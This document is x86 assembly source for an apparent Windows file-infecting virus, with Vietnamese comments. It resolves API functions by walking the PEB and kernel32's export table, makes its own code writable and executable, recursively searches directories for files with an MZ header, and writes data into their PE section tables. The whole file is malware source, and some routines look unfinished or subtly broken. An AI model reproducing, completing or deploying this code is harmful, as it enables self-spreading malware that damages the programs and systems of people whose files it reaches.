.386
.model flat, stdcall
option casemap:none
ASSUME FS:NOTHING

.code
start:

call lap
lap:
pop 	ebp
sub		ebp, offset lap
push	ebp					;+

xor		eax, eax
mov		eax, fs:[030h]
mov		eax, [eax + 0ch]
mov		eax, [eax + 0ch]
mov		eax, [eax + 00h]
mov		eax, [eax + 00h]
mov		eax, [eax + 18h]
mov		ebx, eax
push	ebx					;+

add		eax, 3ch
mov		ecx, dword ptr [eax]
sub		eax, 3ch
add		eax, ecx
add		eax, 78h
mov		ecx, dword ptr [eax]
add		ecx, ebx
push	ecx					;+

add		ecx, 20h
mov		ecx, dword ptr [ecx]
add		ecx, ebx

mov		edx, ecx

pop		ecx					;-
pop		ebp					;-
pop		eax					;-

push	ecx
push	ebp
xor		ebx, ebx
xor		ecx, ecx
mov		ecx, 0fh
loop_find_getproc:
cld
mov		esi, offset getprocaddress
add		esi, eax	
mov		edi, [edx+ ebx]
add		edi, ebp
mov		ecx, 0fh
add		ebx, 4
repe	cmpsb
jne		loop_find_getproc

pop		edx
pop 	ecx
push	eax
push	ecx

sub		ebx, 4
shr		ebx, 1

add		ecx, 24h
mov		ecx, dword ptr [ecx]
add		ecx, ebx

add		ecx, edx
mov		cx, word ptr [ecx]

xor 	eax, eax
mov		ax, cx
pop		ecx
push	ecx
add		ecx, 1ch
mov		ecx, dword ptr [ecx]
imul	eax, 4h
add		ecx, eax
add		ecx, edx
mov		eax, dword ptr [ecx]
add		eax, edx
pop		ebx
pop		ebx

push	ebx			;delta
push	edx			;hmodule
push	eax			;getprocaddress

pop		eax
pop		edx
pop		ebx
push	ebx
push	edx
push	eax

mov		ecx, offset virtualprotect
add		ecx, ebx

push	ecx
push	edx
call	eax

;cap quyen rwx
call	get
get:
pop		ebp
push	ebp
push	esp
push	40h
push	1000h
push	ebp
call	eax

pop		ecx			;old
pop		eax			;gpa
pop		edx			;hmodule
pop		ebp			;delta

mov		[offset kernel32 + ebp], edx
mov		[offset gpa + ebp], eax
mov		[offset old + ebp], ecx
mov		[offset delta + ebp], ebp


;Lay ham FindFirstFile
mov		eax, offset findfirstfile
add		eax, ebp
mov		ebx, [offset kernel32 + ebp]
mov		ecx, [offset gpa + ebp] 

push	eax
push	ebx
call	ecx

mov		[offset fff + ebp], eax

;Lay ham FindNextFile
mov		eax, offset findnextfile
add		eax, ebp
mov		ebx, [offset kernel32 + ebp]
mov		ecx, [offset gpa + ebp] 
push	eax
push	ebx
call	ecx
mov		[offset fnf + ebp], eax

;Lay ham RtlZeroMemory
mov		eax, offset memsetzero
add		eax, ebp
mov		ebx, [offset kernel32 + ebp]
mov		ecx, [offset gpa + ebp] 
push	eax
push	ebx
call	ecx
mov		[offset msz + ebp], eax

;Lay ham CreateFile
mov		eax, offset createfile
add		eax, ebp
mov		ebx, [offset kernel32 + ebp]
mov		ecx, [offset gpa + ebp] 
push	eax
push	ebx
call	ecx
mov		[offset cf + ebp], eax

;Lay ham ReadFile
mov		eax, offset readfile
add		eax, ebp
mov		ebx, [offset kernel32 + ebp]
mov		ecx, [offset gpa + ebp] 
push	eax
push	ebx
call	ecx
mov		[offset rf + ebp], eax

;Lay ham WriteFile
mov		eax, offset writefile
add		eax, ebp
mov		ebx, [offset kernel32 + ebp]
mov		ecx, [offset gpa + ebp] 
push	eax
push	ebx
call	ecx
mov		[offset wf + ebp], eax

;Lay ham MessageBox
mov		eax, offset messagebox
add		eax, ebp
mov		ebx, [offset kernel32 + ebp]
mov		ecx, [offset gpa + ebp] 
push	eax
push	ebx
call	ecx
mov		[offset mg + ebp], eax

;Lay ham lstrlen
mov		eax, offset len
add		eax, ebp
mov		ebx, [offset kernel32 + ebp]
mov		ecx, [offset gpa + ebp] 
push	eax
push	ebx
call	ecx
mov		[offset strlen + ebp], eax

;Lay ham lstrcpy
mov		eax, offset cpy
add		eax, ebp
mov		ebx, [offset kernel32 + ebp]
mov		ecx, [offset gpa + ebp] 
push	eax
push	ebx
call	ecx
mov		[offset strcpy + ebp], eax

;Lay ham CloseHandle
mov		eax, offset clshandle
add		eax, ebp
mov		ebx, [offset kernel32 + ebp]
mov		ecx, [offset gpa + ebp] 
push	eax
push	ebx
call	ecx
mov		[offset clh + ebp], eax

;Lay ham GetModuleFileName
mov		eax, offset getpathfile
add		eax, ebp
mov		ebx, [offset kernel32 + ebp]
mov		ecx, [offset gpa + ebp] 
push	eax
push	ebx
call	ecx
mov		[offset gmfn + ebp], eax

;Lay ham GetCurrentDirectoryA

mov		eax, offset getpath
add		eax, ebp
mov		ebx, [offset kernel32 + ebp]
mov		ecx, [offset gpa + ebp] 
push	eax
push	ebx
call	ecx
mov		[offset gcd + ebp], eax



lea		eax, [offset path + ebp]
push	eax					;path
push	256					;size
call	[offset gcd + ebp]			;GetCurrentDirectoryA

lea		ecx, path
add		ecx, ebp

xor		ebx, ebx
mov		ebx, [offset delta + ebp]

push	ebx
push	ecx
call	browse_files
;---------------------------------------------------------------------
inject_file PROC uses eax ebx ecx edx handleF:dword, del:dword
	
	LOCAL path_file_current[262]:byte
	LOCAL inject_tmp:dword
	LOCAL this_file_virus_handle:dword
	LOCAL ov[20]:dword
	LOCAL numberofsection:word
	LOCAL nos_injected:word
	LOCAL aop_virus:dword
	LOCAL aop_injected:dword
	LOCAL image_sz:dword
	LOCAL anew:dword
	LOCAL section[10]:dword
	LOCAL delta_aop:dword
	LOCAL injected:dword
	
	xor		eax, eax
	lea		eax, path_file_current
	
	mov		ebx, del
	add		ebx, offset gmfn
	mov		ebx, [ebx]
	
	push	262
	push	eax
	push	0
	call	ebx			;getmodulefilenamea
	
	cmp		eax, 0
	je		end_inject_file
	
	xor		eax, eax
	lea		eax, path_file_current
	
	mov		ebx, del
	add		ebx, offset cf
	mov		ebx, [ebx]
	
	push	0
	push	80h					;normal
	push	3					;OPEN_EXISTING
	push	0
	push	00000003h			;read va write
	push	0C0000000h			;read va write
	push	eax					;pathtmp
	call	ebx					;CreateFile
	
	
	cmp 	eax, 0ffffffffh
	je		end_inject_file
	mov		this_file_virus_handle, eax
	xor		ebx, ebx
	mov		ebx, 60
	
	
	lea		eax, ov
	add		eax, 8h
	mov		dword ptr [eax], ebx
	
	;read e_lfanew
	lea		ebx, ov
	lea		ecx, inject_tmp
	mov		edx, del
	add		edx, offset rf
	mov		edx, [edx]
	push	0
	push	4							;4 byte
	push	ecx							;buffer
	push	this_file_virus_handle		;handle
	call	edx 						;ReadFile
	
	mov		ebx, inject_tmp
	lea		eax, ov
	add		eax, 8h
	add		ebx, 6h					
	mov		dword ptr [eax], ebx
	
	;read numberofsection
	lea		ebx, ov
	lea		ecx, numberofsection
	
	mov		edx, del
	add		edx, offset rf
	mov		edx, [edx]
	
	push	ebx
	push	0
	push	2							;4 byte
	push	ecx							;buffer
	push	this_file_virus_handle		;handle
	call	edx							;ReadFile
	
	mov		ebx, inject_tmp
	lea		eax, ov
	add		eax, 8h
	add		ebx, 28h					
	mov		dword ptr [eax], ebx
	
	;read AddressOfEntryPoint
	lea		ebx, ov
	lea		ecx, aop_virus
	
	mov		edx, del
	add		edx, offset rf
	mov		edx, [edx]
	
	push	ebx
	push	0
	push	4							;4 byte
	push	ecx							;buffer
	push	this_file_virus_handle		;handle
	call	edx							;ReadFile
	
	xor		edx, edx
	xor 	ecx, ecx
	mov		cx, numberofsection
	mov		edx, inject_tmp
	add		edx, 0f8h
	
	find_section:
	
	lea		eax, ov
	add		eax, 8h					
	mov		dword ptr [eax], edx
	push	ecx
	push	edx
	;read AddressOfEntryPoint
	lea		ebx, ov
	lea		ecx, section

	mov		edx, del
	add		edx, offset rf
	mov		edx, [edx]
	
	push	ebx
	push	0
	push	40							;40 byte
	push	ecx							;buffer
	push	this_file_virus_handle		;handle
	call	edx							;ReadFile
	
	mov		eax, [section+0ch]
	mov		ebx, aop_virus
	pop		edx
	pop		ecx
	cmp		eax, ebx
	ja		finded
	add		edx, 40
	dec		ecx
	jmp		find_section
	finded:
	sub		edx, 40
	lea		eax, ov
	add		eax, 8h					
	mov		dword ptr [eax], edx
	
	lea		ebx, ov
	lea		ecx, section
	lea		edx, rf
	add		edx, del
	mov		edx, [edx]
	
	push	ebx
	push	0
	push	40							;40 byte
	push	ecx							;buffer
	push	this_file_virus_handle		;handle
	call	edx 						;ReadFile
	
	mov		eax, [section+0ch]
	mov		ebx, aop_virus
	sub		ebx, eax
	mov		delta_aop, ebx
	
	;readfile injected
	lea		eax, ov
	add		eax, 8h					
	mov		dword ptr [eax], 60
	
	lea		ebx, ov
	lea		ecx, injected
	lea		edx, rf
	add		edx, del
	mov		edx, [edx]
	
	push	ebx
	push	0
	push	4							;40 byte
	push	ecx							;buffer
	push	handleF						;handle
	call	edx							;ReadFile
	
	mov		ebx, injected
	lea		eax, ov
	add		eax, 8h	
	add		ebx, 6				
	mov		dword ptr [eax], ebx
	
	lea		ebx, ov
	lea		ecx, nos_injected
	;doc so section cua file bi lay
	lea		edx, rf
	add		edx, del
	mov		edx, [edx]
	
	push	ebx
	push	0
	push	2							;40 byte
	push	ecx							;buffer
	push	handleF						;handle
	call	edx							;ReadFile
	
	xor		eax, eax
	mov		ax, nos_injected
	mov		bl, 40
	mul		bl
	mov		ebx, injected
	add		ebx, 0f8h
	add		ebx, eax
	
	lea		edx, ov
	add		edx, 8
	mov		dword ptr [edx], ebx
	lea		edx, ov 
	lea		eax, section
	
	
	lea		ebx, wf
	add		ebx, del
	mov		ebx, [ebx]
	
	push	edx
	push	0
	push	40
	push	eax
	push	handleF
	call	ebx				
	
	
	
	
	end_inject_file:
	ret

inject_file endp


;-----------------------------------------------------------------------

browse_files PROC uses eax ebx ecx edx, pathFile:dword, del:dword

	LOCAL hfind:dword
	LOCAL pathtmp[262]:byte


find_first_file:

xor		ebx, ebx
mov		eax, del
add		eax, offset msz
mov		eax, [eax]
mov		ebx, 262
lea		ecx, pathtmp

push	ebx			;size
push	ecx			;buff
call 	eax			;call RtlZeroMemory

mov		ebx, del
add		ebx, offset strcpy
mov		ebx, [ebx]
mov		ecx, pathFile		
lea		edx, pathtmp
push	ecx					;pathFile
push	edx					;pathtmp
call	ebx					;call lstrcpy


mov		ebx, pathFile
add		ebx, eax
mov		al, 5ch
mov		[ebx], al
inc		ebx
mov		al, 2ah
mov		[ebx], al

mov		ecx, del
add		ecx, offset fff
mov		eax, [ecx]

mov		ebx, pathFile

mov		ecx, del
add		ecx, offset dwFileAttributes


push	ecx			;WIN32_FIND_DATAA
push	ebx			;pathFile
call 	eax			;FindFirstFile

cmp		eax, -1
jz		done_find

lea		ecx, hfind
mov		[ecx], eax


find_next_file:

;check folder

mov		ecx, del
add		ecx, offset dwFileAttributes
mov		ecx, [ecx]
test	ecx, 10h
jnz		check_home	;folder thi check . va .., khong thi tim file thuc thi de lay


;check file thuc thi de lay file


mov		eax, del
add		eax, offset strlen
mov		eax, [eax]

lea		ebx, pathtmp
push	ebx					;string
call 	eax					;call lstrlen

dec		eax
mov		ebx, del
add		ebx, offset strcpy 
mov		ebx, [ebx]
lea		ecx, pathtmp
add		ecx, eax
mov		edx, del
add		edx, offset cFileName
		
push	ecx					;pathtmp[eax]
push	edx					;cFileName
call	ebx					;call lstrcpy

lea		eax, pathtmp

mov		ebx, del
add		ebx, offset cf
mov		ebx, [ebx]

push	0
push	80h					;normal
push	3					;OPEN_EXISTING
push	0
push	00000003h			;read va write
push	0C0000000h			;read va write
push	eax					;pathtmp
call	ebx					;CreateFile

mov		ebx, del
add		ebx, offset h_file
mov		[ebx], eax	

mov		eax, del
add		eax, offset tmp

mov		ebx, del
add		ebx, offset rf
mov		ebx, [ebx]

mov		ecx, del
add		ecx, offset h_file
mov		ecx, [ecx]

push	0
push	0
push	4
push	eax
push	ecx
call	ebx			;ReadFile

xor		eax, eax
mov		eax, del
add		eax, offset tmp
mov		eax, [eax]

cmp		ax, 5a4dh

jne		close_handle

mov		ebx, del
add		ebx, offset h_file
mov		ebx,[ebx]

push	delta
push	ebx
call 	inject_file


close_handle:

mov		ebx, del
add		ebx, offset h_file
mov		ebx, [ebx]
mov		ecx, del
add		ecx, offset clh
mov		ecx, [ecx]
push	ebx						;h_file
call	ecx						;closehandle

jmp		next_file

;check folder . va ..
check_home:
mov		ebx, del
add		ebx, offset cFileName
mov		al, byte ptr [ebx]

cmp		al, 2eh
je		next_file		;neu la . va .. thi bo qua de FindNextFile neu khong thi check junction


;check junction
check_junction:
test	ecx, 400h
jnz		next_file		;neu la junction thi bo qua de FindNextFile neu khong thi de quy duyet trong folder


;xu ly path de de quy

mov		eax, del
add		eax, offset strlen
mov		eax, [eax]

lea		ebx, pathtmp
push	ebx					;string
call 	eax					;call lstrlen

dec		eax
mov		ebx, del
add		ebx, offset strcpy
mov		ebx, [ebx]
lea		ecx, pathtmp
add		ecx, eax
mov		edx, del
add		edx, offset cFileName		

push	edx					;pathtmp[eax]
push	ecx					;cFileName
call	ebx					;call lstrcpy

mov		eax, del
add		eax, offset strlen
mov		eax, [eax]

lea		ebx, pathtmp
push	ebx					;string
call 	eax					;call lstrlen

dec		eax
lea		ebx, pathtmp
add		ebx, eax
mov		al, 5ch
mov		[ebx], al
inc		ebx
mov		al, 2ah
mov		[ebx], al

xor		eax, eax
mov		eax, del

lea		ebx, pathtmp

push	eax
push	ebx
call	browse_files


;------------------

next_file:


;mov		ebx, del
;add		ebx, offset h_file
;mov		ebx, [ebx]
;mov		ecx, del
;add		ecx, offset clh
;mov		ecx, [ecx]
;push	ebx						;h_file
;call	ecx						;closehandle

xor		ebx, ebx
mov		eax, del
add		eax, offset msz
mov		eax, [eax]
mov		ebx, 140h
mov		ecx, del
add		ecx, offset dwFileAttributes

push	ebx			;buff
push	ecx			;size
call 	eax			;call RtlZeroMemory

mov		eax, del
add		eax, offset fnf
mov		eax, [fnf]
mov		ebx, hfind

mov		ecx, del
add		ecx, offset dwFileAttributes		

push	ecx			;win32_find_data
push	ebx			;hfind
call 	eax			;call FindNextFile

cmp		eax, 0h
jbe		done_find
ja		find_next_file

done_find:

ret

browse_files endp
;----------------------------------------------------------------------
test	ebx, ebx
;------------------------------------------------------------------------
delta			dd 0
beg				dd 0
kernel32		dd 0
old				dd 0
gpa				dd 0
fff				dd 0
fnf				dd 0
path			db 262 dup(0)
gcd				dd 0
gmfn			dd 0
h_file			dd 0
msz				dd 0
cf				dd 0
rf				dd 0
wf				dd 0
mg				dd 0
strlen			dd 0
strcpy			dd 0
tmp				dd 0
clh				dd 0


tit				db "Hello world" , 0
getprocaddress 	db "GetProcAddress", 0
findfirstfile	db "FindFirstFileA", 0
findnextfile 	db "FindNextFileA", 0
writefile  		db "WriteFile", 0
readfile		db "ReadFile", 0
messagebox		db "MessageBoxA", 0
loadlib			db "LoadLibraryA", 0
lib_user32		db "user32.dll", 0
virtualprotect	db "VirtualProtect", 0
getpath			db "GetCurrentDirectoryA", 0
createfile 		db "CreateFileA", 0
getpathfile		db "GetModuleFileName", 0

memsetzero		db "RtlZeroMemory", 0
len				db "lstrlenA", 0
cpy				db "lstrcpyA", 0

clshandle		db "CloseHandle", 0		 


;_win32_find_data
dwFileAttributes    dd 0
time				dd 6 dup(0)
nFileSizeHigh       dd 0
nFileSizeLow        dd 0
dwReserved0         dd 0
dwReserved1         dd 0
cFileName           db 260 dup(?)
cAlternateFileName  db 14 dup(?)

end start
